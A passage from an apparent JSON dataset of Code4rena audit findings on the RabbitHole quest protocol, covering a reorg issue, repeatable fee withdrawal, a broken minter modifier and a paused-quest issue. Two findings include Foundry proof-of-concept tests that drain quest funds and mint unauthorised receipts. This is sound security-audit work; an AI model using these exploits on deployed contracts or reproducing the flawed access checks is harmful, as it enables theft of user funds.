Steps\n\nDeploy the quest contract via `create2` with `salt` that includes `msg.sender` and `rewardTokenAddress_`.\n\n**[waynehoover (RabbitHole) acknowledged](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/661#issuecomment-1504018250)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report discusses a potential issue with the `createQuest` function in the `QuestFactory.sol` contract. This function deploys a quest contract using a specific address derivation method, which may be vulnerable to a reorg attack on certain blockchain networks. This attack could allow someone to create a quest and transfer funds to it before the original creator, potentially leading to the theft of user funds. To mitigate this issue, it is recommended to deploy the quest contract using a different method that includes additional security measures. This bug has been acknowledged by the developer and steps are being taken to address it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/661",
      "tags": [],
      "finders": [
        "V\\_B"
      ]
    },
    {
      "id": "43344",
      "title": "[H-02] Protocol fees can be withdrawn multiple times in `Erc20Quest`",
      "impact": "HIGH",
      "content": "\nThe `withdrawFee` function present in the `Erc20Quest` contract can be used to withdraw protocol fees after a quest has ended, which are sent to the protocol fee recipient address:\n\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Erc20Quest.sol#L102-L104>\n\n```solidity\nfunction withdrawFee() public onlyAdminWithdrawAfterEnd {\n    IERC20(rewardToken).safeTransfer(protocolFeeRecipient, protocolFee());\n}\n```\n\nThis function doesn't provide any kind of protection and can be called multiple times, which will send more tokens than intended to the protocol fee recipient, stealing funds from the contract.\n\n### Impact\n\nThe `withdrawFee` function can be called multiples after a quest has ended, potentially stealing funds from other people. The contract may have funds from unclaimed receipts (i.e. users that have completed the quest, redeemed their receipt but haven't claimed their rewards yet) and remaining tokens from participants who didn't complete the quest, which can be claimed back by the owner of the quest.\n\nNote also that the `onlyAdminWithdrawAfterEnd` modifier, even though it indicates that an \"admin\" should be allowed to call this function, only validates the quest end time and fails to provide any kind of access control:\n\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L76-L79>\n\n```solidity\nmodifier onlyAdminWithdrawAfterEnd() {\n    if (block.timestamp < endTime) revert NoWithdrawDuringClaim();\n    _;\n}\n```\n\nThis means that anyone could call this function, so even if the quest owner or the protocol fee recipient behave correctly, a griefer could potentially call this function right after the quest end time to remove all (or most) of the funds from the contract.\n\n### Proof of Concept\n\nIn the following demonstration, the `withdrawFee` function is called multiple times by a bad actor to remove all tokens from the quest contract.\n\n```solidity\ncontract AuditTest is Test {\n    address deployer;\n    uint256 signerPrivateKey;\n    address signer;\n    address royaltyRecipient;\n    address minter;\n    address protocolFeeRecipient;\n\n    QuestFactory factory;\n    ReceiptRenderer receiptRenderer;\n    RabbitHoleReceipt receipt;\n    TicketRenderer ticketRenderer;\n    RabbitHoleTickets tickets;\n    ERC20 token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        signerPrivateKey = 0x123;\n        signer = vm.addr(signerPrivateKey);\n        vm.label(signer, \"signer\");\n        royaltyRecipient = makeAddr(\"royaltyRecipient\");\n        minter = makeAddr(\"minter\");\n        protocolFeeRecipient = makeAddr(\"protocolFeeRecipient\");\n\n        vm.startPrank(deployer);\n\n        // Receipt\n        receiptRenderer = new ReceiptRenderer();\n        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();\n        receipt = RabbitHoleReceipt(\n            address(new ERC1967Proxy(address(receiptImpl), \"\"))\n        );\n        receipt.initialize(\n            address(receiptRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // factory\n        QuestFactory factoryImpl = new QuestFactory();\n        factory = QuestFactory(\n            address(new ERC1967Proxy(address(factoryImpl), \"\"))\n        );\n        factory.initialize(signer, address(receipt), protocolFeeRecipient);\n        receipt.setMinterAddress(address(factory));\n\n        // tickets\n        ticketRenderer = new TicketRenderer();\n        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();\n        tickets = RabbitHoleTickets(\n            address(new ERC1967Proxy(address(ticketsImpl), \"\"))\n        );\n        tickets.initialize(\n            address(ticketRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // ERC20 token\n        token = new ERC20(\"Mock ERC20\", \"MERC20\");\n        factory.setRewardAllowlistAddress(address(token), true);\n\n        vm.stopPrank();\n    }\n\n    function signReceipt(address account, string memory questId)\n        internal\n        view\n        returns (bytes32 hash, bytes memory signature)\n    {\n        hash = keccak256(abi.encodePacked(account, questId));\n        bytes32 message = ECDSA.toEthSignedMessageHash(hash);\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, message);\n        signature = abi.encodePacked(r, s, v);\n    }\n\n    function claimReceipt(address account, string memory questId) internal {\n        (bytes32 hash, bytes memory signature) = signReceipt(account, questId);\n        vm.prank(account);\n        factory.mintReceipt(questId, hash, signature);\n    }\n    \n    function test_Erc20Quest_ProtocolFeeWithdrawMultipleTimes() public {\n        address alice = makeAddr(\"alice\");\n        address attacker = makeAddr(\"attacker\");\n\n        uint256 startTime = block.timestamp + 1 hours;\n        uint256 endTime = startTime + 1 hours;\n        uint256 totalParticipants = 1;\n        uint256 rewardAmountOrTokenId = 1 ether;\n        string memory questId = \"a quest\";\n\n        // create, fund and start quest\n        vm.startPrank(deployer);\n\n        Erc20Quest quest = Erc20Quest(\n            factory.createQuest(\n                address(token),\n                endTime,\n                startTime,\n                totalParticipants,\n                rewardAmountOrTokenId,\n                \"erc20\",\n                questId\n            )\n        );\n\n        uint256 rewards = totalParticipants * rewardAmountOrTokenId;\n        uint256 fees = (rewards * factory.questFee()) / 10_000;\n        deal(address(token), address(quest), rewards + fees);\n        quest.start();\n\n        vm.stopPrank();\n\n        // simulate at least one user claims a receipt\n        claimReceipt(alice, questId);\n\n        // simulate time elapses until the end of the quest\n        vm.warp(endTime);\n\n        // The following can be executed by attacker (griefer) or by the fee recipient\n        vm.startPrank(attacker);\n\n        uint256 protocolFee = quest.protocolFee();\n        uint256 withdrawCalls = (rewards + fees) / protocolFee;\n\n        for (uint256 i = 0; i < withdrawCalls; i++) {\n            quest.withdrawFee();\n        }\n\n        // Fee recipient has 100% of the funds\n        assertEq(token.balanceOf(protocolFeeRecipient), rewards + fees);\n        assertEq(token.balanceOf(address(quest)), 0);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### Recommendation\n\nAdd a flag to the contract to indicate if protocol fees have been already withdrawn. Add a check to prevent the function from being called again.\n\n**[waynehoover (RabbitHole) disagreed with severity and commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/605#issuecomment-1440970195):**\n > I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners.\n> \n> As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is up to the owner to be sure they are executing the function correctly and in the correct context.\n> \n> The owner understands how this function works, so they can be sure not to call it multiple times.\n\n**[gzeon (warden) commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/605#issuecomment-1441228306):**\n > > While I agree that this is an issue, but not a high risk issue. I expect high risk issues to be issues that can be called by anyone, not owners.\n> > \n> > As owners there are plenty of ways we can sabotage our contracts (for example via the set* functions) it is up to the owner to be sure they are executing the function correctly and in the correct context.\n> > \n> > The owner understands how this function works, so they can be sure not to call it multiple times.\n> \n> `onlyAdminWithdrawAfterEnd` is not `onlyAdmin`, anyone can call `withdrawFee` after end.\n\n**[kirk-baird (judge) commented](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/605#issuecomment-1442573720):**\n > I agree with @gzeon. This issue is a combination of two sub issues:\n> - Anyone can call `withdrawFee()`\n> - `withdrawFee()` can be called multiple times\n> \n> Allowing it to be called by anyone is sufficient to rate it high severity.\n\n\n\n***\n \n",
      "summary": "\nThe `withdrawFee` function in the `Erc20Quest` contract can be called multiple times, allowing someone to steal funds from the contract. This can happen after the quest has ended, potentially taking funds from other participants. The function also does not have proper access control, meaning anyone can call it. This could lead to a griefer taking all or most of the funds from the contract. It is recommended to add a check to prevent the function from being called multiple times and to limit access to only the contract owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/605",
      "tags": [],
      "finders": [
        "doublesharp",
        "HollaDieWaldfee",
        "mert\\_eren",
        "glcanvas",
        "yixxas",
        "0xngndev",
        "holme",
        "ladboy233",
        "cryptonue",
        "KIntern\\_NA",
        "usmannk",
        "peanuts",
        "SovaSlava",
        "bytes032",
        "KmanOfficial",
        "Iurii3",
        "carrotsmuggler",
        "lukris02",
        "rbserver",
        "CodingNameKiki",
        "tnevler",
        "mahdikarimi",
        "adriro",
        "AkshaySrivastav",
        "codeislight",
        "IllIllI",
        "fs0c",
        "Bauer",
        "hihen",
        "cccz",
        "peakbolt",
        "Ruhum",
        "wait",
        "0xRobocop",
        "Atarpara",
        "trustindistrust",
        "hansfriese",
        "chaduke",
        "horsefacts",
        "M4TZ1P",
        "zaskoh",
        "mrpathfindr",
        "prestoncodes",
        "ArmedGoose",
        "MiniGlome",
        "manikantanynala97",
        "martin",
        "Garrett",
        "omis",
        "bin2chen",
        "zadaru13",
        "ElKu",
        "gzeon",
        "Lotus",
        "evan",
        "0xmrhoodie",
        "sashik\\_eth",
        "rvierdiiev",
        "hl\\_",
        "timongty"
      ]
    },
    {
      "id": "43343",
      "title": "[H-01] Bad implementation in minter access control for `RabbitHoleReceipt` and `RabbitHoleTickets` contracts",
      "impact": "HIGH",
      "content": "\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61><br>\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L47-L50>\n\nBoth `RabbitHoleReceipt` and `RabbitHoleTickets` contracts define a `mint` function that is protected by a `onlyMinter` modifier:\n\nRabbitHoleReceipt:\n\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L98-L104>\n\n```solidity\nfunction mint(address to_, string memory questId_) public onlyMinter {\n    _tokenIds.increment();\n    uint newTokenID = _tokenIds.current();\n    questIdForTokenId[newTokenID] = questId_;\n    timestampForTokenId[newTokenID] = block.timestamp;\n    _safeMint(to_, newTokenID);\n}\n```\n\nRabbitHoleTickets:\n\n<https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L83-L85>\n\n```solidity\nfunction mint(address to_, uint256 id_, uint256 amount_, bytes memory data_) public onlyMinter {\n    _mint(to_, id_, amount_, data_);\n}\n```\n\nHowever, in both cases the modifier implementation is flawed as there isn't any check for a require or revert, the comparison will silently return false and let the execution continue:\n\n```solidity\nmodifier onlyMinter() {\n    msg.sender == minterAddress;\n    _;\n}\n```\n\n### Impact\n\nAny account can mint any number of `RabbitHoleReceipt` and `RabbitHoleTickets` tokens.\n\nThis represents a critical issue as receipts can be used to claim rewards in quests. An attacker can freely mint receipt tokens for any quest to steal all the rewards from it.\n\n### Proof of Concept\n\nThe following test demonstrates the issue.\n\n```solidity\ncontract AuditTest is Test {\n    address deployer;\n    uint256 signerPrivateKey;\n    address signer;\n    address royaltyRecipient;\n    address minter;\n    address protocolFeeRecipient;\n\n    QuestFactory factory;\n    ReceiptRenderer receiptRenderer;\n    RabbitHoleReceipt receipt;\n    TicketRenderer ticketRenderer;\n    RabbitHoleTickets tickets;\n    ERC20 token;\n\n    function setUp() public {\n        deployer = makeAddr(\"deployer\");\n        signerPrivateKey = 0x123;\n        signer = vm.addr(signerPrivateKey);\n        vm.label(signer, \"signer\");\n        royaltyRecipient = makeAddr(\"royaltyRecipient\");\n        minter = makeAddr(\"minter\");\n        protocolFeeRecipient = makeAddr(\"protocolFeeRecipient\");\n\n        vm.startPrank(deployer);\n\n        // Receipt\n        receiptRenderer = new ReceiptRenderer();\n        RabbitHoleReceipt receiptImpl = new RabbitHoleReceipt();\n        receipt = RabbitHoleReceipt(\n            address(new ERC1967Proxy(address(receiptImpl), \"\"))\n        );\n        receipt.initialize(\n            address(receiptRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // factory\n        QuestFactory factoryImpl = new QuestFactory();\n        factory = QuestFactory(\n            address(new ERC1967Proxy(address(factoryImpl), \"\"))\n        );\n        factory.initialize(signer, address(receipt), protocolFeeRecipient);\n        receipt.setMinterAddress(address(factory));\n\n        // tickets\n        ticketRenderer = new TicketRenderer();\n        RabbitHoleTickets ticketsImpl = new RabbitHoleTickets();\n        tickets = RabbitHoleTickets(\n            address(new ERC1967Proxy(address(ticketsImpl), \"\"))\n        );\n        tickets.initialize(\n            address(ticketRenderer),\n            royaltyRecipient,\n            minter,\n            0\n        );\n\n        // ERC20 token\n        token = new ERC20(\"Mock ERC20\", \"MERC20\");\n        factory.setRewardAllowlistAddress(address(token), true);\n\n        vm.stopPrank();\n    }\n    \n    function test_RabbitHoleReceipt_RabbitHoleTickets_AnyoneCanMint() public {\n        address attacker = makeAddr(\"attacker\");\n\n        vm.startPrank(attacker);\n\n        // Anyone can freely mint RabbitHoleReceipt\n        string memory questId = \"a quest\";\n        receipt.mint(attacker, questId);\n        assertEq(receipt.balanceOf(attacker), 1);\n\n        // Anyone can freely mint RabbitHoleTickets\n        uint256 tokenId = 0;\n        tickets.mint(attacker, tokenId, 1, \"\");\n        assertEq(tickets.balanceOf(attacker, tokenId), 1);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### Recommendation\n\nThe modifier should require that the caller is the `minterAddress` in order to revert the call in case this condition doesn't hold.\n\n```solidity\nmodifier onlyMinter() {\n    require(msg.sender == minterAddress);\n    _;\n}\n```\n**[waynehoover (RabbitHole) confirmed](https://github.com/code-423n4/2023-01-rabbithole-findings/issues/608)**\n\n\n\n***\n\n",
      "summary": "\nSummary: The `RabbitHoleReceipt` and `RabbitHoleTickets` contracts have a flaw in their `mint` function which allows anyone to mint tokens and claim rewards from quests. The `onlyMinter` modifier is missing a `require` statement to check if the caller is the designated `minterAddress`. This can be fixed by adding a `require` statement to the modifier. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "RabbitHole",
      "source_link": "https://code4rena.com/reports/2023-01-rabbithole",
      "github_link": "https://github.com/code-423n4/2023-01-rabbithole-findings/issues/608",
      "tags": [],
      "finders": [
        "vanko1",
        "0xMirce",
        "millersplanet",
        "tsvetanovv",
        "frankudoags",
        "usmannk",
        "Timenov",
        "SovaSlava",
        "vagrant",
        "mookimgo",
        "Cryptor",
        "rbserver",
        "c3phas",
        "DimitarDimitrov",
        "adriro",
        "Kenshin",
        "AkshaySrivastav",
        "btk",
        "Josiah",
        "codeislight",
        "Awesome",
        "Deivitto",
        "shark",
        "RaymondFam",
        "Aymen0909",
        "UdarTeam",
        "trustindistrust",
        "hansfriese",
        "pfapostol",
        "Jayus",
        "sakshamguruji",
        "pavankv",
        "prestoncodes",
        "oberon",
        "luxartvinsec",
        "petersspetrov",
        "fellows",
        "Garrett",
        "paspe",
        "7siech",
        "ElKu",
        "KrisApostolov",
        "gzeon",
        "0xMAKEOUTHILL",
        "thekmj",
        "navinavu",
        "xAriextz",
        "AlexCzm",
        "yosuke",
        "amaechieth"
      ]
    },
    {
      "id": "8867",
      "title": "[L-07] The function ",
      "impact": "LOW",
      "content": "<h2 id=\"l-07-the-function-mintreceipt-shouldnt-mint-receipts-to-users-if-the-quest-is-paused\" style=\"position:relative;\"><a href=\"#l-07-the-function-mintreceipt-shouldnt-mint-receipts-to-users-if-the-quest-is-paused\" aria-label=\"l 07 the function mintreceipt shouldnt mint receipts to users if the quest is paused permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] The function <code>mintReceipt</code> shouldnâ€™t mint receipts to users, if the quest is paused</h2>\n<p>For now the function <code>mintReceipt</code> doesnâ€™t issue hashes before the quest has started or after the quest has ended. </p>\n<p>This is done off-chain with the help of <code>claimSignerAddress</code>, but the off-chain side doesnâ€™t check if a quest is in paused state.</p>\n<p>So even if a quest is in paused state duo to some sort of issue occurring, the function <code>mintReceipt</code> can still mint receipts for this particular quest.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">QuestFactory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">219</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mintReceipt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hash_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signature_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">220</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">numberMinted</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">totalParticipants</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">OverMaxAllowedToMint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">221</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">addressMinted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AddressAlreadyMinted</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">)) != </span><span class=\"mtk12\">hash_</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidHash</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">recoverSigner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hash_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signature_</span><span class=\"mtk1\">) != </span><span class=\"mtk12\">claimSignerAddress</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AddressNotSigned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">224</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">225</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">addressMinted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">226</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">numberMinted</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">227</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ReceiptMinted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">rabbitholeReceiptContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>A recommended change l thought of:</p>\n<ol>\n<li>Create a private mapping, which will check if the quest address is paused</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isPaused</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<ol start=\"2\">\n<li>Create an owner function, so the owner can change the state of the mapping. </li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setQuestState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_paused</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">isPaused</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">_paused</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<ol start=\"3\">\n<li>Apply the check in <code>mintReceipt</code>, so users wonâ€™t be able claim receipts, when the quest is paused.</li>\n</ol>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mintReceipt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hash_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">signature_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+       </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">isPaused</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">QuestPaused</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">numberMinted</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">totalParticipants</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">OverMaxAllowedToMint</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quests</span><span class=\"mtk1\">[</span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">].</span><span class=\"mtk12\">addressMinted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">] == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AddressAlreadyMinted</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">questId_</span><span class=\"mtk1\">)) != </span><span class=\"mtk12\">hash_</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidHash</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">recoverSigner</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hash_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">signature_</span><span class=\"mtk1\">) != </span><span class=\"mtk12\">claimSignerAddress</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">AddressNotSigned</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">quests</span><span 